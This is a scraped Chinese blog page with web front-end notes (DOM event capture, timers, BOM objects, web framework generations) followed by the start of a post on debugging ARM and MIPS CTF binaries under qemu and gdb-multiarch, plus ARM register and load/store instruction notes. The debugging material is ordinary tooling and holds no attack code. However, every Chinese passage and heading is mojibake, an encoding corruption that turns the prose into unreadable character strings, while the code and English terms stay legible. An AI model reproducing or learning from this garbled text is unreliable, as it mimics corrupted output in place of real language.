<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> * &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span>FORM</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>DIV</span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>P<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">let</span> elem <span class="keyword">of</span> <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;*&#x27;</span>)) &#123;</span></span><br><span class="line"><span class="javascript">        elem.addEventListener(<span class="string">&quot;click&quot;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="params">e</span> =&gt;</span> alert(<span class="string">`Capturing: <span class="subst">$&#123;elem.tagName&#125;</span>`</span>), <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>åœæ­¢å¤„ç†ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ·»åŠ stopPropagationäº‹ä»¶</p>
<p>ğŸ”ºW3Cå½¢å¼ä¸ºå…ˆCaptureå†Bubblingçš„ç»¼åˆå½¢å¼</p>

        <h4 id="â‘£äº‹ä»¶çš„ç›®æ ‡"   >
          <a href="#â‘£äº‹ä»¶çš„ç›®æ ‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£äº‹ä»¶çš„ç›®æ ‡" class="headerlink" title="â‘£äº‹ä»¶çš„ç›®æ ‡"></a>â‘£äº‹ä»¶çš„ç›®æ ‡</h4>
      
        <h4 id="â‘¤æ—¶é—´ç›¸å…³çš„äº‹ä»¶"   >
          <a href="#â‘¤æ—¶é—´ç›¸å…³çš„äº‹ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤æ—¶é—´ç›¸å…³çš„äº‹ä»¶" class="headerlink" title="â‘¤æ—¶é—´ç›¸å…³çš„äº‹ä»¶"></a>â‘¤æ—¶é—´ç›¸å…³çš„äº‹ä»¶</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(func,<span class="number">50</span>);</span><br><span class="line">token = <span class="built_in">setInterval</span>(func,<span class="number">50</span>);</span><br><span class="line"><span class="built_in">clearInterval</span>(token);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¥äº‹ä»¶çš„çº¿ç¨‹"   >
          <a href="#â‘¥äº‹ä»¶çš„çº¿ç¨‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¥äº‹ä»¶çš„çº¿ç¨‹" class="headerlink" title="â‘¥äº‹ä»¶çš„çº¿ç¨‹"></a>â‘¥äº‹ä»¶çš„çº¿ç¨‹</h4>
      <p>å•çº¿ç¨‹å¤„ç†äº‹ä»¶ï¼Œä¸ä¼šåŒæ—¶æ‰§è¡Œå¤šä¸ªäº‹ä»¶ã€‚è‹¥å­˜åœ¨å›è°ƒå‡½æ•°æ—¶ï¼Œä¹Ÿæ˜¯é¡ºåºè¿›è¡Œå¤„ç†çš„ï¼Œé¡ºåºå¯èƒ½ä¼šä¸å¤ªä¸€æ ·ã€‚</p>

        <h1 id="å››ã€BOMæ ‘"   >
          <a href="#å››ã€BOMæ ‘" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€BOMæ ‘" class="headerlink" title="å››ã€BOMæ ‘"></a>å››ã€BOMæ ‘</h1>
      <p>æµè§ˆå™¨ä¸­çš„å¯¹è±¡æ ‘</p>
<p><code>navigator</code>  <code>screen</code>  <code>location</code>  <code>history</code></p>

        <h2 id="1-åŸºæœ¬è¯­æ³•-2"   >
          <a href="#1-åŸºæœ¬è¯­æ³•-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŸºæœ¬è¯­æ³•-2" class="headerlink" title="1.åŸºæœ¬è¯­æ³•"></a>1.åŸºæœ¬è¯­æ³•</h2>
      
        <h3 id="1-å¸¸è§å¯¹è±¡"   >
          <a href="#1-å¸¸è§å¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¸¸è§å¯¹è±¡" class="headerlink" title="(1)å¸¸è§å¯¹è±¡"></a>(1)å¸¸è§å¯¹è±¡</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//locationå³å½“å‰é¡µé¢çš„htmlæ–‡ä»¶æŒ‡é’ˆ</span></span><br><span class="line"><span class="built_in">window</span>.location.href = <span class="string">&quot;newPage.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//historyä¿å­˜ç”¨æˆ·è®¿é—®è¿‡çš„é¡µé¢ï¼Œä»¥ä¸‹ä¸ºæ‰§è¡Œå›é€€ä¸Šä¸€ä¸ªé¡µé¢æŒ‡ä»¤</span></span><br><span class="line"><span class="built_in">window</span>.history.go(-<span class="number">1</span>);</span><br><span class="line">history.go(-<span class="number">3</span>); <span class="comment">// Go back three pages</span></span><br><span class="line">history.go(<span class="number">3</span>); <span class="comment">// Go forward three pages </span></span><br><span class="line">history.back(); <span class="comment">// Same as history.go(-1) </span></span><br><span class="line">history.forward();<span class="comment">// Same as history.go(1)</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211229145548.png" alt="image-20211130111020329"></p>

        <h2 id="â–²æ³¨ï¼šdomå’Œscripté¡ºåºç”Ÿæˆé—®é¢˜"   >
          <a href="#â–²æ³¨ï¼šdomå’Œscripté¡ºåºç”Ÿæˆé—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²æ³¨ï¼šdomå’Œscripté¡ºåºç”Ÿæˆé—®é¢˜" class="headerlink" title="â–²æ³¨ï¼šdomå’Œscripté¡ºåºç”Ÿæˆé—®é¢˜"></a>â–²æ³¨ï¼šdomå’Œscripté¡ºåºç”Ÿæˆé—®é¢˜</h2>
      <p>render treeæ˜¯æ¸²æŸ“çš„</p>
<p>scriptä¼šå½±å“domæ ‘çš„æ„å»ºï¼Œhtmlä¸­åœ¨scriptä¹‹åçš„domæ ‘ç»“æ„ä¸ä¼šåœ¨scriptä¸­å­˜åœ¨ã€‚</p>

        <h1 id="äº”ã€å¤šä»£WebæŠ€æœ¯"   >
          <a href="#äº”ã€å¤šä»£WebæŠ€æœ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€å¤šä»£WebæŠ€æœ¯" class="headerlink" title="äº”ã€å¤šä»£WebæŠ€æœ¯"></a>äº”ã€å¤šä»£WebæŠ€æœ¯</h1>
      
        <h2 id="1-æ— çŠ¶æ€"   >
          <a href="#1-æ— çŠ¶æ€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ— çŠ¶æ€" class="headerlink" title="1.æ— çŠ¶æ€"></a>1.æ— çŠ¶æ€</h2>
      <p>å³ä¸ä¿å­˜ç”¨æˆ·ä¿¡æ¯</p>

        <h2 id="2-ç¬¬ä¸€ä»£"   >
          <a href="#2-ç¬¬ä¸€ä»£" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç¬¬ä¸€ä»£" class="headerlink" title="2.ç¬¬ä¸€ä»£"></a>2.ç¬¬ä¸€ä»£</h2>
      <p>PHP,ASP,.netç­‰åº”ç”¨</p>

        <h2 id="3-ç¬¬äºŒä»£"   >
          <a href="#3-ç¬¬äºŒä»£" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç¬¬äºŒä»£" class="headerlink" title="3.ç¬¬äºŒä»£"></a>3.ç¬¬äºŒä»£</h2>
      <p>Ruby on Rails,Djangoç­‰</p>
<p>åˆ›å»ºmodel-view-controllers , Templatesç­‰</p>

        <h4 id="Model"   >
          <a href="#Model" class="heading-link"><i class="fas fa-link"></i></a><a href="#Model" class="headerlink" title="Model:"></a>Model:</h4>
      <p>å¤§å¤šæ˜¯Java Scriptçš„å¯¹è±¡</p>

        <h4 id="View"   >
          <a href="#View" class="heading-link"><i class="fas fa-link"></i></a><a href="#View" class="headerlink" title="View:"></a>View:</h4>
      <p>HTML/CSSç­‰</p>
<p>æœ€ç»ˆå‘ˆç°ç»™ç”¨æˆ·çš„Webæ¡†æ¶ï¼ŒHTMLåŠ ä¸Šå…¶ä»–çš„ä¸€äº›ä»£ç </p>

        <h4 id="Controller"   >
          <a href="#Controller" class="heading-link"><i class="fas fa-link"></i></a><a href="#Controller" class="headerlink" title="Controller:"></a>Controller:</h4>
      <p>æŒ‰é’®æ§å»ºç­‰</p>
<p>åœ¨æœåŠ¡å™¨ä¸­è·å–modelè¿›è¡Œå¤„ç†ï¼Œå°†é¡µé¢å‘ˆç°å‡ºæ¥ï¼Œå¸¸è§çš„Java Scriptçš„æ‰§è¡Œä»£ç </p>

        <h2 id="4-ç¬¬ä¸‰ä»£"   >
          <a href="#4-ç¬¬ä¸‰ä»£" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ç¬¬ä¸‰ä»£" class="headerlink" title="4.ç¬¬ä¸‰ä»£"></a>4.ç¬¬ä¸‰ä»£</h2>
      <p>Angular JS</p>
<p>æ›´åŠ ç±»ä¼¼appã€‚</p>

        <h2 id="5-ç¬¬å››ä»£"   >
          <a href="#5-ç¬¬å››ä»£" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-ç¬¬å››ä»£" class="headerlink" title="5.ç¬¬å››ä»£"></a>5.ç¬¬å››ä»£</h2>
      <p>é€šè¿‡è™šæ‹Ÿçš„DOMæ ‘æ¥å½¢æˆé¡µé¢</p>

        <h1 id="Reactå°é¡¹ç›®ï¼š"   >
          <a href="#Reactå°é¡¹ç›®ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#Reactå°é¡¹ç›®ï¼š" class="headerlink" title="Reactå°é¡¹ç›®ï¼š"></a>Reactå°é¡¹ç›®ï¼š</h1>
      <p><a href="https://pig-007.github.io/xx520/">I Love You â¤ï¸ (pig-007.github.io)</a></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/">Armä»0å¼€å§‹</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-08</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>è®°å½•ä¸€ä¸‹å¼‚æ„çš„PWNé¢˜</p>
<p>ğŸ”ºqemu çš„ user æ¨¡å¼ä¸‹ï¼Œæ‰€ä»¥å³ä¾¿ç¨‹åºé‡å¯ libc åœ°å€ä¹Ÿä¸å˜ï¼Œä½†æ˜¯systemæ¨¡å¼ï¼Œå³åŠ äº†å†…æ ¸çš„æƒ…å†µä¸‹å°±ä¼šæ”¹å˜äº†ã€‚</p>

        <h1 id="ä¸€ã€è°ƒè¯•é—®é¢˜"   >
          <a href="#ä¸€ã€è°ƒè¯•é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€è°ƒè¯•é—®é¢˜" class="headerlink" title="ä¸€ã€è°ƒè¯•é—®é¢˜"></a>ä¸€ã€è°ƒè¯•é—®é¢˜</h1>
      
        <h2 id="1-ARMæ¶æ„"   >
          <a href="#1-ARMæ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ARMæ¶æ„" class="headerlink" title="1.ARMæ¶æ„"></a>1.ARMæ¶æ„</h2>
      <p><code>pwndbg</code>å¯¹armæ¶æ„çš„æ”¯æŒè¿˜æ˜¯æŒºå¥½çš„</p>

        <h3 id="1-æ— PIE"   >
          <a href="#1-æ— PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ— PIE" class="headerlink" title="(1)æ— PIE"></a>(1)æ— PIE</h3>
      <p>æ²¡æœ‰PIEçš„æ—¶å€™ï¼Œç›´æ¥ä½¿ç”¨patchelfå°†å…¶é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„æ”¹ä¸€ä¸‹å³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath /home/hacker/glibc/2.23/arm/ --set-interpreter /home/hacker/glibc/2.23/arm/lib/ld-linux.so.3 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åé€šè¿‡qemuåŠ è½½è¿è¡Œåº“å¯åŠ¨</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /home/hacker/glibc/2.23/arm/ -g 12345 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åé€šè¿‡gdb-multiarchè¿æ¥ä¸Šå³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q armNote</span><br><span class="line">target remote: 12345</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±èƒ½è°ƒè¯•äº†ï¼ŒåŒ…æ‹¬pwndbgä¸­çš„å †å—heapï¼Œbinså‘½ä»¤ç­‰ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png" alt="image-20211121161707292"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png" alt="image-20211121161725233"></p>

        <h3 id="2-æœ‰PIE"   >
          <a href="#2-æœ‰PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœ‰PIE" class="headerlink" title="(2)æœ‰PIE"></a>(2)æœ‰PIE</h3>
      <p>è¿™ä¸ªå°±æ¯”è¾ƒå¤æ‚äº†ï¼Œé¦–å…ˆè¿˜æ˜¯æ”¹æ‰ç”¨é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„ï¼Œä¹‹åè¿è¡Œèµ·æ¥ï¼ŒæŸ¥çœ‹vmmap</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png" alt="image-20211121162647509"></p>
<p>è¿™é‡Œåœ¨stackçš„æœ«å°¾ï¼Œå³å›¾ä¸­è“è‰²æ¡†èµ·æ¥çš„å°±æ˜¯elfåŸºåœ°å€ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåæ­£è°ƒè¯•å°±æ˜¯è¿™æ ·çš„ï¼Œå¯èƒ½æ˜¯QEMUå’ŒPIEçš„ç›¸å…³æœºåˆ¶é—®é¢˜æŠŠã€‚</p>
<p>ä¹‹åé€šè¿‡elfBaseæ¥æ–­ç‚¹ï¼Œå†é€šè¿‡gotè¡¨å³å¯æ‰¾åˆ°libcåŸºåœ°å€äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png" alt="image-20211121163058346"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png" alt="image-20211121163230165"></p>
<p>ä¹‹åå†é€šè¿‡<code>add-symbol-file</code>å³å¯å¾—åˆ°åœ°å€äº†ï¼Œåœ°å€ç”±äºqemuçš„å…³ç³»ï¼Œä¸€ç›´æ˜¯ä¸å˜çš„ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œå¦‚æœç›´æ¥æ‰“å°åœ°å€ä¼šå‡ºé”™ï¼ŒåŸå› æœªçŸ¥ï¼Œéœ€è¦é‡è½½ç¬¦å·è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png" alt="image-20211121163909059"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png" alt="image-20211121164400425"></p>
<p>é‡è½½ç¬¦å·è¡¨å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png" alt="image-20211121164500582"></p>
<p>å¯ä»¥çœ‹åˆ°ä¹‹åå°±æ­£ç¡®äº†ã€‚</p>
<p>ä¸è¿‡è¿˜æ˜¯æ²¡æœ‰åŠæ³•è¿›è¡Œbinsï¼Œheapä¹‹ç±»çš„å‘½ä»¤ã€‚è¿™ä¸ªå‘½ä»¤æ˜¯pwndbgä»<code>__libc_malloc_initialized</code>è¿™ä¸ªå…¨å±€ç¬¦å·è·å–çš„ï¼Œä½†æ˜¯æ·»åŠ äº†ç¬¦å·è¡¨ä¹‹åè¿™ä¸ªå…¨å±€ç¬¦å·è¿˜æ˜¯æ²¡æœ‰è¢«é‡æ–°åŠ è½½</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png" alt="image-20211121165405192"></p>
<p>å¯¼è‡´æ— æ³•è¯†åˆ«ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ³•ä½¿ç”¨å †ç›¸å…³å‘½ä»¤ï¼Œä¸è¿‡å¯ä»¥ä»main_arenä¸­ç®€å•çœ‹ä¸€ä¸‹å †ç»“æ„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121170328.png" alt="image-20211121170328689"></p>

        <h2 id="2-MIPSæ¶æ„"   >
          <a href="#2-MIPSæ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-MIPSæ¶æ„" class="headerlink" title="2.MIPSæ¶æ„"></a>2.MIPSæ¶æ„</h2>
      
        <h3 id="1-æ— PIE-1"   >
          <a href="#1-æ— PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ— PIE-1" class="headerlink" title="(1)æ— PIE"></a>(1)æ— PIE</h3>
      <p>å¯ä»¥ç›´æ¥è¿›è¡Œç›¸åº”è¿è¡Œåº“åŠ è½½å³å¯ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯ç”¨gefæ’ä»¶ã€‚</p>

        <h3 id="2-æœ‰PIE-1"   >
          <a href="#2-æœ‰PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœ‰PIE-1" class="headerlink" title="(2)æœ‰PIE"></a>(2)æœ‰PIE</h3>
      <p>pwndbgå¯¹mipsæ¶æ„çš„æ”¯æŒä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹Ÿç”±äºgefå…³äºqemuçš„vmmapå‘½ä»¤ä¸å¤ªå‡†ç¡®ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å€ŸåŠ©pwndbgçš„vmmapå‘½ä»¤è·å–ï¼Œå¦‚åŒä¹‹å‰çš„armæ¶æ„ä¸€æ ·ï¼Œè·å–åˆ°elfåŸºåœ°å€ä¹‹åå³å¯æŸ¥çœ‹å¯¹åº”çš„libcåœ°å€ã€‚</p>

        <h2 id="é¡¹ç›®ï¼š"   >
          <a href="#é¡¹ç›®ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¡¹ç›®ï¼š" class="headerlink" title="é¡¹ç›®ï¼š"></a>é¡¹ç›®ï¼š</h2>
      <p>æˆ–è€…çœ‹é¡¹ç›®ï¼Œè¿™ä¸ªå¯ä»¥ä¸€é”®è·å–å¯¹åº”ç‰ˆæœ¬çš„glibcï¼Œåœ¨gdbè°ƒè¯•ä¸­è‡ªåŠ¨è§£æç¬¦å·è¡¨å’Œåœ°å€ï¼Œæ–¹ä¾¿åšå¼‚æ„çš„pwné¢˜ã€‚</p>
<p><code>mulArchAll</code>:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/mulArchAll.git" >https://github.com/PIG-007/mulArchAll.git</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="äºŒã€ARM"   >
          <a href="#äºŒã€ARM" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€ARM" class="headerlink" title="äºŒã€ARM"></a>äºŒã€ARM</h1>
      
        <h2 id="1-å¯„å­˜å™¨å…³ç³»"   >
          <a href="#1-å¯„å­˜å™¨å…³ç³»" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨å…³ç³»" class="headerlink" title="1.å¯„å­˜å™¨å…³ç³»"></a>1.å¯„å­˜å™¨å…³ç³»</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png" alt="32"></p>
<ul>
<li><p>R0<del>R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0</del>4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0<del>R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0</del>X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)</p>
</li>
<li><p>SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚</p>
</li>
<li><p>PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p>
</li>
<li><p>R11ï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆï¼Œå…¶å®å°±å·®ä¸å¤šæ˜¯FP</p>
</li>
</ul>

        <h2 id="2-æ±‡ç¼–æŒ‡ä»¤"   >
          <a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="2.æ±‡ç¼–æŒ‡ä»¤"></a>2.æ±‡ç¼–æŒ‡ä»¤</h2>
      
        <h3 id="1-å¯„å­˜å™¨ä¼ é€MOV"   >
          <a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="headerlink" title="(1)å¯„å­˜å™¨ä¼ é€MOV"></a>(1)å¯„å­˜å™¨ä¼ é€MOV</h3>
      <p>å¯„å­˜å™¨ä¹‹é—´è¿˜æ˜¯MOVæŒ‡ä»¤ï¼Œæ¯”å¦‚MOV R2,R0;ä½†æ˜¯å¦‚æœæ¶‰åŠåˆ°å†…å­˜ä¸Šçš„ï¼Œåˆ™éœ€è¦å…ˆåŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œæˆ–è€…æŠŠå¯„å­˜å™¨ä¸­çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­</p>

        <h3 id="2-å¯„å­˜å™¨-å†…å­˜ä¼ é€"   >
          <a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="headerlink" title="(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€"></a>(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€</h3>
      <p>STR(store reg)/LDR(load reg)ä»¥åŠSTM(store multiple)/LDM(load multiple)</p>

        <h4 id="â‘ STR-LDRæ¨¡å¼"   >
          <a href="#â‘ STR-LDRæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ STR-LDRæ¨¡å¼" class="headerlink" title="â‘ STR/LDRæ¨¡å¼"></a>â‘ STR/LDRæ¨¡å¼</h4>
      
        <h5 id="STR-Ra-Rb-ï¼š"   >
          <a href="#STR-Ra-Rb-ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#STR-Ra-Rb-ï¼š" class="headerlink" title="STR Ra [Rb]ï¼š"></a>STR Ra [Rb]ï¼š</h5>
      <p>Raä¸­çš„æ•°æ®å­˜å‚¨åˆ°RbæŒ‡å‘çš„å†…å­˜ä¸­</p>

        <h5 id="LDR-Ra-Rb"   >
          <a href="#LDR-Ra-Rb" class="heading-link"><i class="fas fa-link"></i></a><a href="#LDR-Ra-Rb" class="headerlink" title="LDR Ra [Rb]"></a>LDR Ra [Rb]</h5>
      <p>RbæŒ‡å‘çš„å†…å­˜ä¸­çš„å€¼åŠ è½½åˆ°Raä¸­</p>
<p>æ­¤å¤–è¿˜æœ‰å¦‚ä¸‹æƒ…å½¢</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR  R0,[R1, #12]  // R0 --&gt; [R1+12]</span><br><span class="line">LDR  R4,[R5, R6]  // R4 &lt;-- [R5+R6]</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡STM-LDMæ¨¡å¼"   >
          <a href="#â‘¡STM-LDMæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡STM-LDMæ¨¡å¼" class="headerlink" title="â‘¡STM/LDMæ¨¡å¼"></a>â‘¡STM/LDMæ¨¡å¼</h4>
      
        <h5 id="STM-R0-R4-R5"   >
          <a href="#STM-R0-R4-R5" class="heading-link"><i class="fas fa-link"></i></a><a href="#STM-R0-R4-R5" class="headerlink" title="STM R0, {R4,R5}"></a>STM R0, {R4,R5}</h5>
      <p>R4çš„å€¼ä¼ é€ç»™R0+xå¯¹åº”çš„å†…å­˜å•å…ƒï¼Œç„¶åR5çš„å€¼ä¼ ç»™R0+x+xå¯¹åº”çš„å†…å­˜å•å…ƒ</p>
<p>è¿™ä¸ªxå³ç”±åç¼€å†³å®šï¼Œåˆ†åˆ«æœ‰ä»¥ä¸‹å‡ ç§</p>
<ul>
<li><p>DB(Decrease Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>DA(Decrease After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>IB(Increase Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
<li><p>IA(Increase After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
</ul>
<p>è€ŒXåˆ™åœ¨ä¸åŒçš„CPUä½æ•°ä¸‹ä¸åŒï¼Œ32ä¸º4ï¼Œ64åˆ™ä¸º8ã€‚</p>
<p>æ­¤å¤–å †æ ˆçš„å¢é•¿æ–¹å‘å¯ä»¥ä¸åŒï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒæƒ…å½¢ä¸‹ä½œä¸ºåç¼€ï¼Œæ•ˆæœä¸€æ ·çš„</p>
<ul>
<li>FD(Full Descent)ï¼šæ»¡é€’å‡å †æ ˆ</li>
<li>FA(Full Ascent)ï¼šæ»¡é€’å¢å †æ ˆ</li>
<li>ED(Empty Descent)ï¼šç©ºé€’å‡å †æ ˆ</li>
<li>EA(Empty Ascent)ï¼šç©ºé€’å¢å †æ ˆ</li>
</ul>
